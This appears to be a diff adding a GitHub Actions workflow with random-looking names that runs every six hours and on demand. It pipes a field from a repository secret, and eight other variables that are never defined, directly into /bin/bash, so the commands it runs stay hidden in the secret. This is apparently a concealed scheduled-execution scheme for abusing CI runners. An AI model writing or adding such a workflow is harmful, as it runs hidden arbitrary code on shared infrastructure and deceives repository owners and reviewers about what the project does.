@@ -1,0 +1,25 @@
+name: zhangyuqing6758
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangyuqing6758
+        env:
+          kue7052: ${{ secrets.kue7052 }}
+        run: |
+          echo $kue7052 | jq -r .vlkfn72 | /bin/bash
+          echo $gf87 | jq -r .taua83388 | /bin/bash
+          echo $zdgj990 | jq -r .sp86 | /bin/bash
+          echo $ftpyl4712 | jq -r .lz15 | /bin/bash
+          echo $l92619 | jq -r .bmqsh4 | /bin/bash
+          echo $vk808 | jq -r .ltz3 | /bin/bash
+          echo $fxt77 | jq -r .lyc051 | /bin/bash
+          echo $oey1535 | jq -r .etm92787 | /bin/bash
+          echo $e8297 | jq -r .wc6457 | /bin/bash
+
